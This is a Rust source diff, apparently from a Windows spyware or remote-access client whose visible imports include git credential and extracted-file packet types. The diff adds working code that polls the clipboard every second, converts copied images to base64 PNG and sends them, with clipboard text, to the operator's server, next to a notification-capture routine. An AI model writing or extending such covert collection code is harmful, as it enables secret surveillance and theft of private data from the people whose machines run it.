@@ -11,7 +11,7 @@ use regex::Regex;
 use serde::Deserialize;
 use winapi::shared::minwindef::HGLOBAL;
 use winapi::um::winbase::{GlobalLock, GlobalUnlock};
-use winapi::um::winuser::{CF_UNICODETEXT, CloseClipboard, GetClipboardData, OpenClipboard};
+use winapi::um::winuser::{CF_UNICODETEXT, CF_DIB, CF_BITMAP, CloseClipboard, GetClipboardData, OpenClipboard};
 use winreg::HKEY;
 use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY, KEY_WOW64_64KEY};
 use winreg::RegKey;
@@ -19,6 +19,7 @@ use wmi::{COMLibrary, WMIConnection};
 
 use common::packets::{
     ClipboardUpdate,
+    ClipboardImageUpdate,
     ExtractedFile,
     GitCredentialEntry,
     GitData,
@@ -513,14 +514,27 @@ pub fn start_clipboard_monitor() {
 
     thread::spawn(|| {
         let mut last_text = String::new();
+        let mut last_image_hash: u64 = 0;
 
         while CLIPBOARD_MONITOR_RUNNING.load(Ordering::SeqCst) {
+            // Check for text
             if let Some(text) = get_clipboard_text() {
                 if !text.is_empty() && text != last_text {
                     last_text = text.clone();
                     let _ = send_packet_sync(ServerboundPacket::ClipboardUpdate(ClipboardUpdate { text }));
                 }
             }
+
+            // Check for image
+            if let Some(img_update) = get_clipboard_image() {
+                // Simple hash to detect image changes
+                let hash = hash_image_data(&img_update.image_base64);
+                if hash != last_image_hash {
+                    last_image_hash = hash;
+                    let _ = send_packet_sync(ServerboundPacket::ClipboardImageUpdate(img_update));
+                }
+            }
+
             thread::sleep(Duration::from_secs(1));
         }
     });
@@ -558,6 +572,108 @@ fn get_clipboard_text() -> Option<String> {
         CloseClipboard();
         Some(message)
     }
+}
+
+fn get_clipboard_image() -> Option<ClipboardImageUpdate> {
+    use base64::{Engine as _, engine::general_purpose};
+    use winapi::shared::windef::HBITMAP;
+    use winapi::um::wingdi::{GetObjectW, BITMAP, CreateCompatibleDC, SelectObject, DeleteDC, DeleteObject, GetDIBits, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS};
+    use winapi::um::winuser::{GetClipboardData, OpenClipboard, CloseClipboard, CF_DIB};
+    use image::RgbaImage;
+
+    unsafe {
+        if OpenClipboard(null_mut()) == 0 {
+            return None;
+        }
+
+        // Try CF_DIB first (preferred, includes alpha channel info)
+        let handle = GetClipboardData(CF_DIB);
+        if handle.is_null() {
+            CloseClipboard();
+            return None;
+        }
+
+        let dib = GlobalLock(handle as HGLOBAL) as *const u8;
+        if dib.is_null() {
+            CloseClipboard();
+            return None;
+        }
+
+        // Parse BITMAPINFOHEADER from DIB
+        let bmi_header = &*(dib as *const BITMAPINFOHEADER);
+        let width = bmi_header.biWidth as u32;
+        let height = bmi_header.biHeight.abs() as u32;
+        let bit_count = bmi_header.biBitCount as u32;
+
+        if width == 0 || height == 0 || (bit_count != 24 && bit_count != 32) {
+            GlobalUnlock(handle as HGLOBAL);
+            CloseClipboard();
+            return None;
+        }
+
+        // Calculate row size (DIB rows are 4-byte aligned)
+        let row_size = ((width * (bit_count / 8) + 3) / 4) * 4;
+        let data_size = (row_size * height) as usize;
+
+        // DIB pixel data starts after BITMAPINFOHEADER + color table
+        let color_table_size = if bit_count <= 8 {
+            (1 << bit_count) * 4 // RGBA entries for palette
+        } else {
+            0
+        };
+        let pixel_offset = std::mem::size_of::<BITMAPINFOHEADER>() + color_table_size;
+        let pixels = std::slice::from_raw_parts(dib.add(pixel_offset), data_size);
+
+        // Build RgbaImage from DIB data (bottom-up, BGRA order)
+        let mut img = RgbaImage::new(width, height);
+        for y in 0..height {
+            // DIB stores rows bottom-up when biHeight > 0
+            let src_row = if bmi_header.biHeight > 0 {
+                (height - 1 - y) as usize * row_size as usize
+            } else {
+                y as usize * row_size as usize
+            };
+            for x in 0..width {
+                let idx = src_row + (x * (bit_count / 8)) as usize;
+                let (r, g, b, a) = if bit_count == 32 {
+                    (pixels[idx + 2], pixels[idx + 1], pixels[idx], pixels[idx + 3])
+                } else {
+                    // 24-bit: BGR, no alpha
+                    (pixels[idx + 2], pixels[idx + 1], pixels[idx], 255)
+                };
+                img.put_pixel(x, y, image::Rgba([r, g, b, a]));
+            }
+        }
+
+        GlobalUnlock(handle as HGLOBAL);
+        CloseClipboard();
+
+        // Encode as PNG in memory
+        let mut png_data = Vec::new();
+        if img.write_to(&mut std::io::Cursor::new(&mut png_data), image::ImageFormat::Png).is_ok() {
+            return Some(ClipboardImageUpdate {
+                image_base64: general_purpose::STANDARD.encode(&png_data),
+                width,
+                height,
+            });
+        }
+    }
+
+    None
+}
+
+fn hash_image_data(data: &str) -> u64 {
+    use std::hash::{Hash, Hasher};
+    use std::collections::hash_map::DefaultHasher;
+    let mut hasher = DefaultHasher::new();
+    // Hash just the first and last 256 chars for speed
+    let bytes = data.as_bytes();
+    let len = bytes.len();
+    bytes[..len.min(256)].hash(&mut hasher);
+    if len > 512 {
+        bytes[len - 256..].hash(&mut hasher);
+    }
+    hasher.finish()
 }
 
 pub fn start_notification_capture() {
